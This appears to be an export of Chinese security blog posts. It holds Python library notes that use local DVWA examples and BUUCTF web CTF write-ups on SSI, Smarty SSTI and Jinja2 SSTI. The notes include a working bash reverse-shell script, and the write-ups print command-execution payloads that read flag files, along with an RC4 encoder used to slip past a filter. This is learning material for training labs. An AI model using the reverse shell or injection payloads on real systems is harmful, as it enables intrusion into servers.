'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'Cookie': ' security=impossible; PHPSESSID=adcc9b21be4a5689bc5fa145a9f15a25'&#125;# 构造Request对象request = urllib2.Request(url=url, headers=headers)# 请求urlopen()resp = urllib2.urlopen(request)str1 = resp.read()# 正则匹配内容数据(绿色部分为正则表达式)result = re.findall('&lt;div id=\"guestbook_comments\"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出for item in result:    print('Name:'+item[0]+'Content:'+item[1])\n\n功能：python3下 urllib 进行POST提交数据（dvwa xss 提交数据为例）\n\n（说明：python3下 urllib和urllib2 合并成了一个urllib 这个包分为四个模块 ）  (分为：urllib.request urllib.error urllib.parse urllib.robotaparser)\n\n# 设置提交链接url = ' http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 设置headers头部headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie':'security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建data数据data = &#123;'txtName': 'python3', 'mtxMessage': 'connect', 'btnSign': ' Sign Guestbook'&#125;# data进行url编码data = urllib.parse.urlencode(data)# 构建request对象request = urllib.request.Request(url, data.encode('utf-8'), headers)# urllib.request.urlopen()提交resp = urllib.request.urlopen(request)\n\n功能：python3 下 urllib2 + re 实现对dvwa（xss）评论内容爬取# 设置urlurl = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/ '# 设置头部headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': 'security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建requestrequest = urllib.request.Request(url=url, headers=headers)# urlopen() 进行请求resp = urllib.request.urlopen(request)# 用re正则 对返回结果进行处理（转为返回结果文本格式为gbk）str1 = resp.read().decode('gbk')res = re.findall('&lt;div id=\"guestbook_comments\"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出结果print('Tittle'+'\\t'+'Connect')for item in res:    print(item[0] + '\\t\\t' + item[1])\n\n功能：python3下  requests 进行POST提交数据（dvwa xss 提交数据为例）# 设置提交url地址url = 'http://127.0.0.1/DVWA/vulnerabilities/xss_s/ '# 构建headers头部headers = &#123;'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': ' security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 构建需要提交的data数据data = &#123;'txtName': 'request', 'mtxMessage': '123456789', ' btnSign':' Sign Guestbook'&#125;# 进行提交resp = request.post(url=url, data=data, headers=headers)\n\n功能：python3 下 request +re 实现dvwa（xss）评论内容爬取# 设置url链接url = ' http://127.0.0.1/DVWA/vulnerabilities/xss_s/'# 构建headers头部headers = &#123;'User-Agent': ' Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36','Cookie': ' security=low; PHPSESSID=c53448691f29843f229d25fdc0b4871a'&#125;# 进行提交resp = request.get(url=url, headers=headers)str1 = resp.text# 用re正则对返回结果进行处理res = re.findall('&lt;div id=\"guestbook_comments\"&gt;Name: ([a-z1-9A-Z]+)&lt;br /&gt;Message: ([a-zA-Z0-9]+)&lt;br /&gt;&lt;/div&gt;', str1)# 输出print('Tittle'+'\\t'+'Connect')for item in res:    print(item[0] + '\\t\\t' + item[1])\n\n进程/多线程/多进程/队列相关模块subprocess功能：subprocess实现执行命令输出结果\n\n（subprocess 有4个方法都可以实现创建子进程功能，四个方法都是对Popen()方法的封装）（分别为：call() check_call() check_output() 以及3.5之后代替前三个方法的run()）\n\nrun()方法\n# 调用子进程(返回CompletedProcess对象)s = subprocess.run([&apos;ipconfig&apos;, &apos;-all&apos;], stdout=subprocess.PIPE, shell=True)# 输出结果print(s.stdout.decode(&apos;GBK&apos;))\n\nPopen()方法(支持stdin和stdout)\n# 调用子进程(返回subprocess.Popen对象)s = subprocess.Popen('python', stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)# 输入s.stdin.write(b'import sys \\n')s.stdin.write(b'print(sys.version) \\n')s.stdin.close()# 输出print(s.stdout.read().decode('GBK'))s.stdout.clode()\n\n功能：subprocess+socket实现(linux下)反弹shell功能# 创建socket对象s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 连接到远程主机s.connect(('主机地址', 端口号))# 将socket对象的文件描述符复制到系统 0标准输入 1标准输出 2标准错误#（os.dup2(fd, fd2) 将文件描述符fd复制到fd2 ）# (s.fileno() 获取socket对象的文件描述符)os.dup2(s.fileno(), 0)os.dup2(s.fileno(), 1)os.dup2(s.fileno(), 2)# 调用call() 执行指令p = subprocess.call(['/bin/bash', '-i'])\n\nthreading功能：执行输出任务，创建十条线程，同步执行\n# 创建一个需要用多线程完成的任务def task(num):        for _ in range(10):                print('[+] this is %s'%(num))        print('[+] %s end'%(num))# 创建线程池threads = []# 创建多线程并启动多线程for i in range(11):        thread = threading.Thread(target=task, args=(i,), name='线程名')        threads.append(thread)        thread.start()# 设置堵塞for thread in threads:        thread.join()\n\nmultiprocessing(方法与threading的常用几个方法类似)功能：multiprocessing.Process实现多进程# 创建一个需要用多进程完成的任务def worker(num):        for _ in range(10):                print(\"[+] This is %s\"%(num))            print(\"[+] %s end\"%(num))        # 创建进程池    courses = []# 创建进程并启动多进程for i in range(10):    \tcourse = multiprocess.Process(target=worker, args=(i,), name='进程名')    \tcourses.append(course)        courses.start()    # 设置堵塞for course in courses:        course.join()\n\n功能：multiprocessing.dummy实现多线程# 导包from multiprocess.dummy import Pool as ThreadPool# 创建一个需要用多线程完成的任务def worker(num):        print('[+] This is %s'%(num))        time.sleep(1)    # 开4个 worker， 没有参数时默认是cpu的核心数pool = ThreadPool(4)# 设置任务所需参数(把列表遍历完，就会结束, 写爬虫的时候可以用来遍历url)nums = [1,2,3,4,5,6,7,8,9,0]# 执行任务（同时执行4个任务，相当于每次遍历4个,遍历完就结束）results = pool.map(worker, nums)# 关闭和阻塞pool.close()pool.join()\n\nqueue功能：从文件中读取字符保存到队列(queue对象)中，再进行输出\n# 设置读取文件路径filePath = 'file.txt'# 创建队列q = queue.Queue()# 打开文件并输出到队列with open(filePath) as f:        for line in f:                password = line.strip('\\n')                q.put(password)# 输出队列while True:        if not q.empty():                print(q.get())        else:                break\n\n命令行解析模块argparse功能：实现创建命令行选项\n# 创建对象parse = argparse.ArgumentParser(description='在-h中显示的解析注释')# 添加参数#（add_argument(name or flags...[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar] [, dest] )）parse.add_argument('-f', '--file', dest='filename', help='set filename path')parse.add_argument('-y', '--yes', action='store_false', help=\"action default false \")# 解析参数args = parse.parse_args()\n\n编码解码base64功能：实现对字符串的base64编码解码\n(说明：因编码只能是bytes 需要进行utf-8编码 输出的时候 需要str 进行转码输出)\n\n# 定义字符串str1 = \"system('cat /flag.txt');\"# 字符串utf-8编码str1 = str1.encode(encoding='utf-8')# base64编码en_str = base64.b64encode(str1)print(\"base64编码前：\"+ str(str1))print(\"base64编码后：\" + str(en_str))# base64解码de_str = base64.b64decode(en_str)print(\"base解码前：\"+str(en_str))print(\"base解码后：\"+str(de_str))\n\nhashlib功能：hashlib实现对字符串的md5加密# 定义字符串str1 = 'This is not md5'# 字符串编码 str1 = str1.encode(encoding='utf-8')# 创建md5对象m = hashlib.md5()# 加密m.update(str1)str1_md5 = m.hexdigest()# 输出print(\"MD5加密前：\"+str(str1))print(\"MD5加密后：\"+str1_md5)\n\n常用标准库time–时间的访问和转换\n（三种方式表示时间：1.timestamp(时间戳) 2. struct_time (格式化的时间字符串) 3. tuple(元组)）\n\n时间格式相互转化关系图\n\n\n\n\n\n\n\n\ntime()\n\n返回当前时间的时间戳\n\n\nlocaltime([secs])\n\n将一个时间戳转换位当前时区的struct_time,secs参数未提供，则以当前时间为准\n\n\nasctime([t])\n\n将一个表示时间的元组或者struct_time表示为”Sun Jun 20 23:21:05 2020” 这种形式 不设置参数时，默认将time_localtime() 作为参数 \n\n\nmktime(t)\n\n将一个struct_time转化为时间戳\n\n\nsleep(secs)\n\n线程推迟指定的时间运行，单位为秒\n\n\ngmtime([secs])\n\n将一个时间戳转换为UTC时区的struct_time\n\n\nctime([secs])\n\n把一个时间戳转化为time.asctime()”Sun Jun 20 23:21:05 2020”的形式，不设置参数时，默认time.time()为参数 \n\n\nstrftime(format[, t])\n\n把一个代表时间的元组或者struct_time（如由time.localtime()和time.gmtime()返回) 转化为格式化的时间字符串  如t未指定，将传入time.localtime()\n\n\nstrptime(string[, format])\n\n把一个格式化时间字符串转化为struct_time，与strftime是逆操作\n\n\n\nrandom–生成伪随机数\nrandom()\n随机生成0.xxx 的浮点小数\n\n\n\nrandom.random()                                  &gt;&gt;&gt;0.2786970302306403\n\n\nuniform(a, b)\n\n随机生成一个指定范围内的浮点数，a是低位，b是高位\n\n\n\nrandom.uniform(1, 10)&gt;&gt;&gt;2.431852539010123random.uniform(20,100)&gt;&gt;&gt;87.86159294411607\n\n\nrandint(a, b)\n随机生成一个指定范围内的整数，a是低位，b是高位\n\n\n\nrandom.randint(1, 20)&gt;&gt;&gt;18random.randint(20, 50)&gt;&gt;&gt;26\n\n\nchoice(squence) \n\n随机从squence（表示一个有序类型，不是特定类型，而是泛指一些列类型，list，tuple，字符串(字典和集合都是无序的)）中返回一个元素\nx = [2,3,4,1,5,6,7,8,9]random.choice(x)\n\n\n\n3x = [2,3,4,1,5,6,7,8,9]random.choice(x)9\n\n\n\n\n\n\n\n\nsample(sequence, k) \n\n随机从指定序列sequence中返回长度k的片段\n\n\n\nx = [1,2,3,4,5,6,7,8]random.sample(x, 2)&gt;&gt;&gt;[8,4]x = [1,2,3,4,5,6,7,8]random.sample(x, 4)&gt;&gt;&gt;[1,6,3,5]\n\n\nshuffle(x)\n用于将一个列表打乱 (洗牌)\n\n\n\nx = [1,2,3,4,5,6,7,8]random.shuffle(x)&gt;&gt;&gt;[3, 2, 7, 1, 6, 8, 4, 5]\n\nre–正则表达式操作正则表达式修饰符（对应flags）1. re.I 忽略大小写\n\n2. re.L 做本地化识别（locale-aware）匹配\n\n3. re.M 多行匹配，影响^和$\n\n4. re.S 即为.并且包括换行符在内的任意字符（.不包括换行符）\n\n5. re.U 表示特殊字符集\\w,\\W,\\b,\\B,\\d,\\D,\\s,\\S 依赖于Unicode字符属性数据库\n\n6. re.x 为了增加可读性，忽略空格和#后面的注释正则表达式常用模式\n\n\n\n模式\n描述\n\n\n\n^\n匹配字符串的开头\n\n\n$\n匹配字符串的末尾\n\n\n[…]\n用来表示一组字符[0-9] [a-z] …\n\n\n[0-9]\n匹配任何数字\n\n\n[a-z]\n匹配任何小写字母\n\n\n[A-Z]\n匹配任何大写字母\n\n\nre{n}\n精确匹配n个前面表达式\n\n\nre{n,m}\n匹配n到m次由前面的正则表达式定义的片段\n\n\na|b\n匹配a或b\n\n\n(re)\n对正则表达式分组并记住匹配的文本\n\n\n\\w\n匹配字母数字及下划线\n\n\n\\W\n匹配非字母数字及下划线\n\n\n\\s\n匹配任意空白字符\n\n\n\\S\n匹配任意非空字符\n\n\n\\d\n匹配任意数字\n\n\n\\D\n匹配任意非数字\n\n\n正则表达式常用方法\n\nre.compile(pattern[, flags])\n用于编译正则表达式\n\n\n\npattern = re.compile(r'\\d+')res = pattern.match('one12twothree34four')&gt;&gt;&gt;noneres = pattern.search('one12twothree34four')&gt;&gt;&gt;&lt;_sre.SRE_Match object; span=(2, 4), match='12'&gt;&gt;&gt;&gt;m.group()&gt;&gt;&gt;'12'res = pattern.findall('one12twothree34four')&gt;&gt;&gt;['12', '34']\n\n\nre.search(pattern, string[, flags])\n\npattern匹配整个字符串，返回第一个成功的匹配\n\n\n\nres = re.search(r'\\d+', 'abcdefghijkl123lnm345')res.group()&gt;&gt;&gt;'123'\n\n\nre.match(pattern, string[, flags])\npattern匹配字符串起始位置，起始位置没有，则返回none\n\n\n\nres = re.match(r'\\d+', 'abcdef123lijklm345')&gt;&gt;&gt;noneres = re.match(r'\\d+', '123abcdef456')&gt;&gt;&gt;res.group()&gt;&gt;&gt;'123'\n\n\nre.findall(patter, string[, flags])\npatter匹配整个字符串的所有字串，返回一个列表\n\n\n\nres = re.findall(r'\\d+', 'abc123def456lkj789')&gt;&gt;&gt;['123', '456', '789']\n\nsys\nsys模块负责程序与python解释器的交互，提供了一系列的函数和变量，用于操控python的运行时环境。\n\npython解释器交互\nsys.argv[0]\n\n一个列表，其中包含了被传递给python脚本的命令行参数\n\n\nsys.platform\n\n返回运行平台更详细的信息\n\n\nsys.executable\n\n返回python解析器对应的可执行程序所在的绝对路径\n\n\nsys.modules\n\n一个字典，包含的是各种以加载的模块的模块名到模块具体位置的映射，可以通过修改这个字典，重新加载某些模块\n\n\nsys.builtin_module_names\n\n一个字符串元组，元素均为当前所使用的python解释器内置模块名称\n\n\nsys.path\n\n一个字符串组成的列表，各个元素表示的是python搜索模块的路径，在程序期间被初始化\n\n\nsys.stdin\n\n一个属性，python标准输入通道，可实现输入重定向\n\n\nsys.stdout\n\n一个属性，python标准输出，可以实现输出到屏幕或文件中\n\n\nsys.err\n\n一个属性，标准错误输出，输出到屏幕\n\n\nsys.getrecursionlimit()\n\n获取python的最大递归数目\n\n\nsys.setrecursionlimit()\n\n设置最大递归数目\n\n\nsys.getrefcount()\n\n返回python中某个对象被引用的次数\n\n\nsys.getsizeof()\n\n返回作用对象所占用的字节数\n\n\nsys.ps1\n\n一级提示符 python交互界面的 &gt;&gt;&gt;\n\n\nsys.ps2\n\n二级提升符 if xx: 之后的 …\n\n\n\nos\nos模块负责程序与操作系统的交互，提供了访问操作系统底层的接口\n（参考： https://docs.python.org/zh-cn/3.6/library/os.html，https://www.runoob.com/python/python-os-path.html ， https://www.runoob.com/python/os-file-methods.html）\n\n文件和目录（操作文件和目录、进程、文件标识符、路径）\nos.access(path, mode)\n\n检验权限\n\n\nos.chdir(path)\n\n将当前工作目录更改为path\n\n\nos.chflags(path, flags) \n\n设置路径的标记为数字标记\n\n\nos.chmod(path, mode)\n\n更改路径权限\n\n\nos.chown(path, uid, gid)\n\n更改文件所有者 （Unix）\n\n\nos.chroot(path)\n\n将当前进程的根目录更改为path （Unix）\n\n\nos.fchdir(fd)\n\n将当前工作目录更改为文件描述符fd指向的目录（Unix）\n\n\nos.getcwd()\n\n返回表示当前工作目录的字符串\n\n\nos.link(src, dst)\n\n创建一个指向src的硬链接，名为dst （Unix、Windows）\n\n\nos.symlink(src, dst) \n\n创建一个指向src的软链接，名为dst\n\n\nos.listdir(path)\n\n返回一个列表，该列表包含了path中所有文件与目录\n\n\nos.mkdir(path[,mode])\n\n创建一个名为path的目录，应用以数字表示的权限模式mode\n\n\nos.makedirs(name[, mode])\n\n递归目录创建函数\n\n\nos.mkfifo(path[, mode])\n\n创建命名管道，mode为数字\n\n\nos.remove(path)\n\n删除文件path\n\n\nos.removedirs(name)\n\n递归删除目录\n\n\nos.rmdir(path)\n\n删除目录\n\n\nos.rename(src, dst)\n\n将文件或目录src重命名为dst\n\n\nos.renames(old, new)\n\n递归地对文件或目录进行重命名\n\n\nos.replace(src, dst)\n\n将文件或目录src重命名为dst \n\n\nos.stat(path)\n\n获取path指定的路径的信息\n\n\n\n文件描述符操作（ 这些函数对文件描述符所引用的I/O 流进行操作。）\nos.close(fd)\n关闭文件描述符fd\n\n\n\n\nos.closerange(fd_low, fd_high)\n\n关闭fd_low(包括) 到 fd_high(排除)间的文件描述符\n\n\nos.dup(fd)\n\n复制一个文件描述符的副本\n\n\nos.dup2(fd, fd2)\n\n将文件描述符fd复制到fd2\n\n\nos.fchdir(fd)\n\n将当前工作目录更改为文件描述符fd指向的目录 \n\n\nos.fchmod(fd, mode)\n\n将fd指定文件的权限状态修改为mode \n\n\nos.fchown(fd, uid, gid)\n\n分别将fd指定文件的所有者和组ID修改为uid和gid值\n\n\nos.fdatasync(fd)\n\n强制将文件描述符fd指定文件写入磁盘\n\n\nos.fdopen(fd)\n\n返回打开文件描述符fd对应文件的对象\n\n\nos.fpathconf(fd, name)\n\n返回与打开的文件有关的系统配置信息\n\n\nos.fstat(fd)\n\n获取文件描述符fd的状态，返回一个stat_result对象\n\n\nos.fstatvfs(fd)\n\n返回文件系统的信息，该文件系统是文件描述符fd指向的文件所在的文件系统 \n\n\nos.open(path, flags, mode=0o77)\n\n打开文件 path，根据 flags 设置各种标志位，并根据 mode 设置其权限模式。\n\n\nos.write(fd, str)\n\n将str中的字节串写入文件描述符fd。返回实际写入的字节数。\n\n\nos.read(fd, n)\n\n从文件描述符fd中最多读取n个字节。返回一个包含读取字节的字节字符串。\n\n\n\n进程参数（ 这些函数和数据项提供了操作当前进程和用户的信息。）\nos.ctermid()\n返回与进程控制终端对应的文件名（Unix）\n\n\n\n\nos.getlogin()\n\n返回通过控制终端进程进行登录的用户名（Unix、Windows）\n\n\nos.uname()\n\n返回当前操作系统的识别信息（Unix）\n\n\nos.setgid(gid)\n\n设置当前进程的组ID（Unix）\n\n\nos.setsid()\n\n使用系统调用 getsid()（Unix）\n\n\nos.setuid(uid)\n\n设置当前进程的用户ID（Unix）\n\n\nos.getgid()\n\n返回当前进程的实际组ID（Unix）\n\n\nos.getsid(pid) \n\n调用系统调用 getsid()（Unix）\n\n\nos.getuid()\n\n返回当前进程的真实用户ID（Unix）\n\n\nos.getpid()\n\n返回当前进程ID（Unix）\n\n\nos.setegid(egid)\n\n设置当前进程的有效组ID （Unix）\n\n\nos.seteuid(euid)\n\n设置当前进程的有效用户ID (Unix)\n\n\nos.getegid() \n\n返回当前进程的有效组ID（Unix）\n\n\nos.geteuid()\n\n返回当前进程的有效用户ID（Unix）\n\n\nos.setpgid(pid, pgrp)\n\n使用系统调用setpgid(),将pid对应进程的组ID设置为pgrp（Unix）\n\n\nos.getpgid(pid)\n\n根据进程id pid 返回进程的组ID列表（Unix）\n\n\n\n进程管理（ 函数可用于创建和管理进程）\nos._exit(n)\n\n以状态码n(退出原因指令)退出进程,通常用在fork() 出的子进程中使用\n\n\nos.fork()\n\nFork出一个子进程（Unix）\n\n\nos.forkpty()\n\nFork出一个子进程，使用新的伪终端作为子进程的控制终端（返回一对pid, fd）（Unix）\n\n\nos.kill(pid, sid)\n\n将信号sig发送至进程pid sid值为signal.SIGKILL 为终止程序（Unix）\n\n\nos.popen(command[, mode[, bufsize]])\n\n从一个command打开一个管道\n\n\nos.system(command)\n\n在子shell中执行命令（字符串） \n\n\n\n操作路径 os.path ( 该模块在路径名上实现了一些有用的功能)​      \n\nos.path.abspath(path) \n返回路径path的绝对路径\n\n\nos.path.basename(path) \n返回路径path的基本名称\n\n\nos.path.commonpath() \nos.path.commonprefix(list) \n返回list(多个路径)中,所有path共有的最长的路径 \n\n\nos.path.dirname(path) \n返回文件路径\n\n\nos.path.exists(path) \n路径path存在，返回True，不存在，返回False \n\n\nos.path.lexists() \n路径存在则返回True,路径损坏也返回True \n\n\nos.path.getatime(path) \n返回最近访问时间（浮点型秒数）\n\n\nos.path.getmtime(path) \n返回最近文件修改时间\n\n\nos.path.getctime(path) \n返回path创建时间\n\n\nos.path.getsize(path) \n返回文件大小，如果文件不存在就返回错误\n\n\n\n","categories":["Python"],"tags":["Python常用库"]},{"title":"BUUCTF-WEB 【BJDCTF2020】EasySearch 1","url":"/2021/04/16/%5BBJDCTF2020%5DEasySearch%201/","content":"考点：SSI（服务端包含）题打开\n\n发现又是一道登录题，肯定先想到sql注入，各种报错测试，都只是返回一个框。\n扫目录，直接就是dirsearch开扫\nF:\\Tools\\WEB\\Python-Tools\\dirsearch-master&gt;python3 dirsearch.py -u \"http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\" -t 10 -s 1  _|. _ _  _  _  _ _|_    v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 10849Error Log: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\logs\\errors-21-04-16_16-37-46.logTarget: http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn/Output File: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\reports\\82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\\_21-04-16_16-37-46.txt[16:37:46] Starting:[16:37:46] 200 -    1KB - /index.php.swp\n\n得到一个index.php.swp 文件，这里有一个问题，就是开了代理去扫，是扫不出来这个文件的，我也老是忘记关代理。\n得到\n&lt;?php\tob_start();\tfunction get_hash()&#123;\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\t\t$content = uniqid().$random;\t\treturn sha1($content); \t&#125;    header(\"Content-Type: text/html;charset=utf-8\");\t***    if(isset($_POST['username']) and $_POST['username'] != '' )    &#123;        $admin = '6d0bc1';\t\t# 弱类型 只需要找到 md5加密后前6位跟 6d0bc1 相同即可        if ( $admin == substr(md5($_POST['password']),0,6)) &#123;            echo \"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;\";\t\t\t# 构建文件路径            $file_shtml = \"public/\".get_hash().\".shtml\";\t\t\t# 创建文件            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\t\t\t#             $text = '            ***            ***            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;            ***\t\t\t***';\t\t\t# 将 变量$text 的内容 写入 $shtml 文件            fwrite($shtml,$text);\t\t\t# 关闭文件            fclose($shtml);            ***\t\t\techo \"[!] Header  error ...\";        &#125; else &#123;            echo \"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;\";                &#125;else    &#123;\t***    &#125;\t***?&gt;\n\n第一个条件是  if ( $admin == substr(md5($_POST[&#39;password&#39;]),0,6)) ，$admin = &#39;6d0bc1&#39;; ，要求是md5加密某个字符串，然后截取前6位，得到的结果要 与 $admin 相等。\n上脚本\nimport hashlibfor i in range(100000000000):\ta = hashlib.md5(str(i).encode('utf-8')).hexdigest()\t\tif a[0:6] == '6d0bc1':\t\tprint(i)\n\nF:\\Tools\\WEB\\Python-Tools&gt;python3 ctf-指定hash计算.py20206662305004\n\n两个都能用。\n接下来就是最关键的地方了\n$file_shtml = \"public/\".get_hash().\".shtml\";# 创建文件$shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");# $text = '            ***            ***            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;            ***\t\t\t***';# 将 变量$text 的内容 写入 $shtml 文件fwrite($shtml,$text);# 关闭文件fclose($shtml);\n\n大概意思就是，会创建一个包含路径的shtml 文件，会将$_POST[&#39;username&#39;]的值写入到文件中，然后保存，关闭。包含路径的文件会返回到Respone头中。\n大概了解了下，这个属于SSI漏洞，相当于是可用执行命令，通过规定的语法。\n直接payload\n&lt;!--#exec cmd=&quot;find / --name flag*&quot;--&gt;\n\nPOSTusername=%3C%21--%23exec+cmd%3D%22find+%2F+-name+flag*%22--%3E&amp;password=2305004\n\n\n打开\npublic/34fb7252b9dff84b7edd3685b1c691fdd6293a00.shtml\n\n\n再一次提交\nPOSTusername=&lt;!--#exec cmd=&quot;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2305004\n\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSI"]},{"title":"BUUCTF-WEB 【CISCN2019 华东南赛区】Web11 1","url":"/2021/04/21/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11%201/","content":"考点：SSTI题以为这道题跟ikun那道题一样，考的知识点很多，是我想得复杂了。\n分析\n其实打开这张页面，我并不知道这道题是什么类型。只好先用bp去请求这两个接口。请求xff的时候，我添加了 xff头，值为127.0.0.1。回显了127.0.0.1。我就猜到是模板注入题了，加上页面上的关键字 Smarty，Smarty模板注入题，找了几个payload，没什么过滤，直接就回显了。\n&#123;$smarty.version&#125;\n\n\n&#123;system(&apos;cat /flag&apos;)&#125;\n\n\n","categories":["CTF","BUUCTF"],"tags":["CTF","SSTI"]},{"title":"BUUCTF-WEB [CISCN2019 华东南赛区]Double Secret 1","url":"/2021/10/14/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret%201/","content":"考点模板注入\nRC4加密解密\n前置知识jinja2 模板注入payload查看指定路径下所有文件\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n读取文件\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n解题过程分析打开长这样\n\n扫了目录，扫出来robots.txt文件和secret。\nrobots.txt的内容\n\n没有得到任何提示。\n/sectet\n\n太菜了，好像也看不出什么，看了别的师傅wp，可以给secret提交一个secret参数。\n当我提交/secret?secret=aaa会回显\n\n可能存在sql注入嫌疑，当我输入&#39;的时候，回显了。\n\n有点奇怪，又看了wp一眼，这道题是模板注入。\n当输入secret?secret=abc123的时候，会报错。\n\n可以得知网站是python的flask框架写的。\n从报错中得到一部分源码\nif(secret==None):    return 'Tell me your secret.I will encrypt it so others can\\'t see'rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower():    return 'flag detected!'return a\n\n到这我又看不懂了，菜鸡果然一步一个坑。得知这是一个RC4的解密功能，并给出了解密密钥HereIsTreasure，a=render_template_string(safe(deS)),这一句，将解密后的明文渲染成字符串，回显出来。这里有一个safe函数，可能是用来过滤某些关键字对的，无从得知。\n思路已经知道这是模板注入，那么我们可以把模板注入的payload先进行RC4的加密，然后再传入，看看会有什么效果。\n找到一个大师傅的脚本\nimport base64from urllib import parsedef rc4_main(key = \"init_key\", message = \"init_message\"):#返回加密后得内容    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))     j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef rc4_excrypt(plain, box):    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    cipher = \"\".join(res)    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))key = \"HereIsTreasure\"  #此处为密文message = input(\"请输入明文:\\n\")enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),'utf-8')enc_url = parse.quote(enc_init)print(\"rc4加密后的url编码:\"+enc_url)\n\n查看根目录文件的payload\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123;c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).listdir(&apos;/&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n加密得到\n.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C3%A5nw%C2%A7%C2%8E%C2%BC%C2%BE%C3%BBEy%C2%A9%C2%BBj%C2%83.%5B%18%C3%94%C2%89Y%08%1Aw%22%C3%A3%C3%97%C2%997v%C2%A07%0A%1B%C3%82_%C2%AFN%C2%BF%C2%A3%C2%B8%14%C3%81%C2%AAXy%C3%A5%C3%8D%3B%C2%BCS%0Anq%C2%9D%C2%80%C2%B5%C3%AF%C2%B0%C3%862%5E%22zI%C3%9C%09%C3%85%7BW%C3%A3%C2%99%14gk%C3%A4%C2%BBk%C2%BE%C3%83%C2%B1%0D%03%C3%99%18qu%C2%B4%C2%BCR%C2%81%C2%B1%C2%8E4%C2%A7%C3%A0%C3%8E\n\n\n回显了根目录下的文件夹，看到flag.txt\n读取文件的payload\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if 